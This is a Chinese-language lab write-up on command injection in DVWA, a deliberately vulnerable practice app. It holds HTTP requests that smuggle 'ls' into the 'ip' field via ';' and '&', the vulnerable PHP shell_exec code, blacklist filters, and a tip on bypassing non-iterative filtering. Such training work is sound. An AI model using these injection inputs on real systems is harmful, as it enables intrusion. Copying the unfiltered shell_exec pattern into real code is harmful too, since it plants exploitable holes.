---
description: 命令注入练习
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# 命令注入

### 低等级防护

#### 漏洞利用

{% code title="使用简单的分号添加一条命令" lineNumbers="true" %}
```http
// http

POST /DVWA/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.120.134
Content-Length: 31
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://192.168.120.134
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.120.134/DVWA/vulnerabilities/exec/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=dij63sh9c8j9inbeqtq2orpatp; security=low
Connection: keep-alive

ip=127.0.0.1%3Bls&Submit=Submit
```
{% endcode %}

#### 漏洞产生原因

对输入没有过滤

{% code title="" lineNumbers="true" %}
```php
// php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix  对用户的输入没有任何防护
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```
{% endcode %}



### 中等防护

初次尝试使用 `;ls` 命令没有效果, 后端可能有过滤,  再次尝试 `\n`  `|`   `&`  命令都可以执行.

{% code lineNumbers="true" %}
```http
//http
POST /DVWA/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.120.134
Content-Length: 33
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://192.168.120.134
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.120.134/DVWA/vulnerabilities/exec/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=dij63sh9c8j9inbeqtq2orpatp; security=medium
Connection: keep-alive

ip=127.0.0.1%26ls&Submit=Submit
```
{% endcode %}

#### 漏洞原因

使用黑名单过滤,忽略了其他字符

{% code lineNumbers="true" %}
```php
//php

  // Set blacklist 只过滤了两种
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
{% endcode %}

### 高防护

测试了 `\n`  `;`  都不能使用,但是 `|` 可以使用,依然还是使用黑名单过滤

#### 漏洞原因

可以看到依然使用的是黑名单过滤,这里另外一个技巧是很多替换函数或者正则表达式缺乏一种迭代的能力,比如 如果输入`||` 他能过滤,但是如果输入 `|||` 他只能过滤掉`||` 因为函数不是迭代过滤的

{% code lineNumbers="true" %}
```php
// php
    // Set blacklist
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
{% endcode %}

利用方法

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### 不可能的命令注入

这真没办法了





